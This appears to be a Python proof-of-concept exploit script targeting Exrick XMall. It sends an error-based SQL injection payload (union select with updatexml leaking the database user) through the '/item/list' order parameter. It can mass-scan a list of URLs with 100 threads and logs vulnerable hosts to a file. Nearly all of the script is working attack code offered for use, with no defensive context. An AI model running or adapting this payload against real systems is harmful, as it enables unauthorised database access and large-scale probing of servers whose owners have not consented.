import argparse,sys,requests
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def main():
    banner()            
    parser = argparse.ArgumentParser(description = 'Exrick XMall SQL')    
    parser.add_argument('-u','--url',help='input url')
    parser.add_argument('-f','--file',help='input url file')    
    agres = parser.parse_args()                                    
    if agres.url and not agres.file:                        
        poc(agres.url)                             
    elif agres.file and not agres.url:                 
        url_list = []                             
        with open (agres.file,'r',encoding='utf-8') as fp:  
            for i in fp.readlines():                        
                url_list.append(i.strip().replace('\n',''))     
        mp = Pool(100)                      
        mp.map(poc, url_list)               
        mp.close()                          
        mp.join()                            
    else: 
        print(f'usag:\n\t python3 {sys.argv[0]} -h')              

def banner():
    test = """                                                                                                                        

███████╗██╗  ██╗██████╗ ██╗ ██████╗██╗  ██╗    ██╗  ██╗███╗   ███╗ █████╗ ██╗     ██╗     
██╔════╝╚██╗██╔╝██╔══██╗██║██╔════╝██║ ██╔╝    ╚██╗██╔╝████╗ ████║██╔══██╗██║     ██║     
█████╗   ╚███╔╝ ██████╔╝██║██║     █████╔╝      ╚███╔╝ ██╔████╔██║███████║██║     ██║     
██╔══╝   ██╔██╗ ██╔══██╗██║██║     ██╔═██╗      ██╔██╗ ██║╚██╔╝██║██╔══██║██║     ██║     
███████╗██╔╝ ██╗██║  ██║██║╚██████╗██║  ██╗    ██╔╝ ██╗██║ ╚═╝ ██║██║  ██║███████╗███████╗
╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝
                                                                          author:chenlu
                                                                          version:1.0.1                
"""
    print(test)          

def poc(target):
    url = target + '/item/list?draw=1&order%5B0%5D%5Bcolumn%5D=1&order%5B0%5D%5Bdir%5D=desc)a+union+select+updatexml(1,concat(0x7e,user(),0x7e),1)%23;&start=0&length=1&search%5Bvalue%5D=&search%5Bregex%5D=false&cid=-1&_=1679041197136'
    headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36'
    }
    try:
        result = requests.get(url=url,headers=headers,timeout=5,verify=False).text
        if 'message' in result:
            with open('result.txt','a',encoding='utf-8') as f:
                f.write(f'[+]{target}is vulnerabilities present '+'\n')
        else:
            print(f'[-]{target} is not vulabe')
    except:
        print(f'[*]{target} server error')

if __name__ == '__main__':
    main()